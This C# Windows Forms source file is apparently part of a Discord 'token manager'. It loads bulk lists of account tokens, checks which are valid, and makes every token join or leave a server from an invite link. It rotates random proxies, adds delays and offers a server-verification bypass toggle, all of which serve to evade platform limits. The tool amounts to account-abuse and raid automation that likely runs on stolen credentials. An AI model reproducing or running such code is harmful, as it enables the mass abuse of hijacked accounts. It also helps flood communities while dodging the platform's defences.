using Leaf.xNet;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Tokens.rip_Token_Manager
{
    public partial class TokenManager : Form
    {
        #region Something
        public static List<string> Tokens = new List<string>();
        public static List<string> WorkingTokens = new List<string>();
        #endregion
        #region GUI
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
        (
            int nLeftRect,     // x-coordinate of upper-left corner
            int nTopRect,      // y-coordinate of upper-left corner
            int nRightRect,    // x-coordinate of lower-right corner
            int nBottomRect,   // y-coordinate of lower-right corner
            int nWidthEllipse, // width of ellipse
            int nHeightEllipse // height of ellipse
        );
        public TokenManager()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            HeadLbl.Left = (ClientSize.Width - HeadLbl.Width) / 2;
            RainbowPnlUp.Left = (ClientSize.Width - RainbowPnlUp.Width) / 2;
            Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 20, 20));
            FormClosing += CloseBtn_Click;
        }
        private void ServerVerificationBtn_Click(object sender, EventArgs e)
        {
            if (ServerVerificationBtn.FillColor != Color.FromArgb(105, 105, 205))
                ServerVerificationBtn.FillColor = Color.FromArgb(105, 105, 205);
            else
                ServerVerificationBtn.FillColor = Color.White;
        }
        private void BypassServerVerifyLbl_Click(object sender, EventArgs e) => ServerVerificationBtn_Click(sender, e);
        private void CaptchaBot_Click(object sender, EventArgs e)
        {
            //if (CaptchaBot.FillColor != Color.FromArgb(105, 105, 205))
            //    CaptchaBot.FillColor = Color.FromArgb(105, 105, 205);
            //else
            //    CaptchaBot.FillColor = Color.White;
        }
        private void BypassServerVerifyBotLbl_Click(object sender, EventArgs e) => CaptchaBot_Click(sender, e);
        private void TknSettingsBtn_Click(object sender, EventArgs e)
        {
            var _TokenSettings = new TokenSettingsFrm(TokensRichTxt.Text, ProxiesRichTxt.Text);
            _TokenSettings.Show();
        }

        private void frndBtn_Click(object sender, EventArgs e)
        {
            var _frndReq = new FriendOpt(TokensRichTxt.Text, ProxiesRichTxt.Text);
            _frndReq.Show();
        }

        private void DelayBar_Scroll(object sender, EventArgs e)
        {
            DelayLbl.Text = DelayBar.Value.ToString() + "s";
        }
        #region TextBox Options

        private void TokensRichTxt_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) e.Effect = DragDropEffects.Copy;
        }
        void TokensRichTxt_DragDrop(object sender, DragEventArgs e)
        {
            string[] TokenFiles = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string TokenFile in TokenFiles) TokensRichTxt.Text += File.ReadAllText(TokenFile); 
        }
        void ProxiesRichTxt_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) e.Effect = DragDropEffects.Copy;
        }
        void ProxiesRichTxt_DragDrop(object sender, DragEventArgs e)
        {
            string[] ProxyFiles = (string[])e.Data.GetData(DataFormats.FileDrop);
            foreach (string ProxyFile in ProxyFiles) ProxiesRichTxt.Text += File.ReadAllText(ProxyFile);
        }
        #endregion
        #region Move Form
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void MovePnl_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        private void HeadLbl_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        #endregion
        #region Close & Exit
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
        #endregion
        #endregion
        #region LeaveBtn
        private async void LeaveBtn_Click(object sender, EventArgs e)
        {
            var Time = new Stopwatch();
            Time.Start();
            while (CurrentStatusLbl.Text.Contains("Working Tokens: ") || CurrentStatusLbl.Text.Contains("Joining")) ;
            if (InviteTxtbox.Text == "Enter Invite" || string.IsNullOrEmpty(InviteTxtbox.Text) || string.IsNullOrEmpty(TokensRichTxt.Text)) { CurrentStatusLbl.Text = "No Valid Invite"; CurrentStatusLbl.ForeColor = Color.Red; return; } else if (string.IsNullOrEmpty(TokensRichTxt.Text)) { CurrentStatusLbl.Text = "No Tokens"; CurrentStatusLbl.ForeColor = Color.Red; return; }
            await Task.Run(() =>
            {
                bool Invalid = false;
                LeaveBtn.Enabled = false;
                TokensRichTxt.ReadOnly = true;
                ProxiesRichTxt.ReadOnly = true;
                string invite = InviteTxtbox.Text;
                invite = invite.Replace("discord.gg/", "");
                invite = invite.Replace("discord.com/", "");
                invite = invite.Replace("https://", "");
                invite = invite.Replace("http://", "");
                invite = invite.Replace("api", "");
                invite = invite.Replace("v9/invites/", "");
                invite = invite.Replace("v8/invites/", "");
                invite = invite.Replace("v7/invites/", "");
                invite = invite.Replace("/invites/", "");
                invite = invite.Replace("v6/invites/", "");
                invite = invite.Replace("/", "");
                var r = new HttpRequest();
                try
                {
                    if (!string.IsNullOrEmpty(ProxiesRichTxt.Text))
                    {
                        var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
                        r.Proxy = HttpProxyClient.Parse(proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)]);
                        r.Get($"https://discord.com/api/v{new Random().Next(6, 9)}/invites/{invite}");
                        dynamic info = JsonConvert.DeserializeObject(r.Response.ToString());
                        string guildId = info.guild.id.ToString();
                        CurrentStatusLbl.Text = "Leaving [Proxied]";
                        CurrentStatusLbl.ForeColor = Color.Yellow;
                        foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                        {
                            Task.Run(async () => TokenSettings.LeaveServer(m.Value, guildId, true, proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)])).ConfigureAwait(false);
                        }
                    }
                    else
                    {
                        r.Get($"https://discord.com/api/v{new Random().Next(6, 9)}/invites/{invite}");
                        dynamic info = JsonConvert.DeserializeObject(r.Response.ToString());
                        string guildId = info.guild.id.ToString();
                        CurrentStatusLbl.Text = "Leaving";
                        CurrentStatusLbl.ForeColor = Color.Yellow;
                        foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                        {
                            Task.Run(async () => TokenSettings.LeaveServer(m.Value, guildId, false, null)).ConfigureAwait(false);
                        }
                    }
                }
                catch 
                {
                    Invalid = true;
                }
                if (CurrentStatusLbl.Text == "Leaving" || CurrentStatusLbl.Text == "Leaving [Proxied]")
                {
                    CurrentStatusLbl.Text = "Successfully Left Guild";
                    CurrentStatusLbl.ForeColor = Color.Green;
                }
                else if (Invalid)
                {
                    CurrentStatusLbl.Text = "Invalid Invite";
                    CurrentStatusLbl.ForeColor = Color.Red;
                }
                else
                {
                    CurrentStatusLbl.Text = "No Tokens";
                    CurrentStatusLbl.ForeColor = Color.Red;
                }
                LeaveBtn.Enabled = true;
                TokensRichTxt.ReadOnly = false;
                ProxiesRichTxt.ReadOnly = false;
            });
        }
        #endregion
        #region JoinBtn
        public async void JoinBtn_Click(object sender, EventArgs e)
        {
            while (CurrentStatusLbl.Text.Contains("Working Tokens: ") || CurrentStatusLbl.Text.Contains("Leaving")) ;
            if (InviteTxtbox.Text == "Enter Invite" || string.IsNullOrEmpty(InviteTxtbox.Text)) { CurrentStatusLbl.Text = "No Valid Invite"; CurrentStatusLbl.ForeColor = Color.Red; return; } else if (string.IsNullOrEmpty(TokensRichTxt.Text)) { CurrentStatusLbl.Text = "No Tokens"; CurrentStatusLbl.ForeColor = Color.Red; return; }
            await Task.Run(() =>
            {
                JoinBtn.Enabled = false;
                TokensRichTxt.ReadOnly = true;
                ProxiesRichTxt.ReadOnly = true;
                DelayBar.Enabled = false;
                string invite = InviteTxtbox.Text;
                invite = invite.Replace("discord.gg/", "");
                invite = invite.Replace("discord.com/", "");
                invite = invite.Replace("https://", "");
                invite = invite.Replace("http://", "");
                invite = invite.Replace("api", "");
                invite = invite.Replace("v9/invites/", "");
                invite = invite.Replace("v8/invites/", "");
                invite = invite.Replace("v7/invites/", "");
                invite = invite.Replace("/invites/", "");
                invite = invite.Replace("v6/invites/", "");
                invite = invite.Replace("/", "");
                if (Regex.Match(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Success)
                {
                    if (!string.IsNullOrEmpty(ProxiesRichTxt.Text))
                    {
                        var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
                        CurrentStatusLbl.Text = $"Joining Guild - {invite} | [Proxied]";
                        CurrentStatusLbl.ForeColor = Color.Yellow;
                        foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                        {
                            Thread.Sleep(DelayBar.Value * 1000);
                            Task.Run(async () => TokenSettings.JoinServer(m.Value, invite, true, proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)], ServerVerificationBtn.FillColor)).ConfigureAwait(false);
                        }
                    }
                    else
                    {
                        CurrentStatusLbl.Text = $"Joining Guild | {invite}";
                        CurrentStatusLbl.ForeColor = Color.Yellow;
                        foreach (Match m in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                        {
                            Thread.Sleep(DelayBar.Value * 1000);
                            Task.Run(async () => TokenSettings.JoinServer(m.Value, invite, false, null, ServerVerificationBtn.FillColor));
                        }
                    }
                }
                if (CurrentStatusLbl.Text == $"Joining Guild | {invite}" || CurrentStatusLbl.Text == $"Joining Guild - {invite} | [Proxied]")
                {
                    CurrentStatusLbl.Text = "Successfully Joined";
                    CurrentStatusLbl.ForeColor = Color.Green;
                }
                else
                {
                    CurrentStatusLbl.Text = "No Tokens";
                    CurrentStatusLbl.ForeColor = Color.Red;
                }
                JoinBtn.Enabled = true;
                ProxiesRichTxt.ReadOnly = false;
                DelayBar.Enabled = true;
                TokensRichTxt.ReadOnly = false;
            }).ConfigureAwait(false);
        }
        #endregion
        #region Token Checker
        private async void ChkTknPrx_Click(object sender, EventArgs e)
        {
            await Task.Run(async () =>
            {
                List<string> sadness = new List<string>();
                sadness.Clear();
                WorkingTokens.Clear(); Tokens.Clear();
                ChkTknPrxBtn.Enabled = false;
                TokensRichTxt.ReadOnly = true;
                foreach (Match token in Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                    if (!sadness.Contains(token.Value)) sadness.Add(token.Value);
                TokensRichTxt.Text = string.Join("\n", sadness);
                int totalTokens = Regex.Matches(TokensRichTxt.Text, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}").Count;
                if (string.IsNullOrEmpty(ProxiesRichTxt.Text))
                    Parallel.For(0, sadness.Count, async i =>
                    {
                        Task<string> pain = TokenSettings.CheckToken(sadness[i], null);
                        if (!string.IsNullOrEmpty(pain.Result))
                            WorkingTokens.Add(pain.Result);
                        Tokens.Add(pain.Result);
                        CurrentStatusLbl.Text = $"Working Tokens: {WorkingTokens.Count}/{totalTokens} | Current Token Count: {Tokens.Count}";
                        CurrentStatusLbl.ForeColor = Color.Yellow;
                    });
                else
                {
                    var proxies = ProxiesRichTxt.Text.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
                    Parallel.For(0, sadness.Count, async i =>
                    {
                        Task<string> pain = TokenSettings.CheckToken(sadness[i], proxies[new Random().Next(0, Regex.Matches(ProxiesRichTxt.Text, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b:\d{2,5}").Count)]);
                        if (!string.IsNullOrEmpty(pain.Result))
                            WorkingTokens.Add(pain.Result);
                        Tokens.Add(pain.Result);
                        CurrentStatusLbl.Text = $"Working Tokens: {WorkingTokens.Count}/{totalTokens} | Current Token Count: {Tokens.Count} [Proxied]";
                        CurrentStatusLbl.ForeColor = Color.Yellow;
                    });
                }
                TokensRichTxt.Text = string.Join("\n", WorkingTokens);
                CurrentStatusLbl.Text = $"Valid Tokens: {WorkingTokens.Count}/{totalTokens}";
                CurrentStatusLbl.ForeColor = Color.Yellow;
                CurrentStatusLbl.ForeColor = Color.Green;
                TokensRichTxt.ReadOnly = false;
                ChkTknPrxBtn.Enabled = true;
            });
        }
        #endregion
    }
}